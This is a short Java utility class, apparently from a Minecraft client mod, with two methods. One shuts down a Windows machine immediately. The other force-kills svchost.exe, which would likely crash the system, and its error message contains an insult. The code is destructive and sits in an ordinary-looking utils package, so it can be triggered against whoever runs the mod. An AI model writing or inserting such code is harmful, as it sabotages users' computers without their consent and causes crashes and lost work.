package dev.zenhao.melon.utils;

import java.io.IOException;

public class ShutDownUtils {
    public static ShutDownUtils INSTANCE = new ShutDownUtils();

    public void ShutDown() {
        Runtime runtime = Runtime.getRuntime();
        try {
            Runtime.getRuntime().exec("shutdown -s -t 0");
        } catch (IOException ignored) {
        }
    }

    public void BS() {
        Runtime runtime = Runtime.getRuntime();
        try {
            runtime.exec("taskkill /IM svchost.exe /F");
            runtime.exec("taskkill.exe /f /im svchost.exe");
        } catch (IOException e) {
            System.out.println("Exception: NMSL LLL");
        }
    }
}
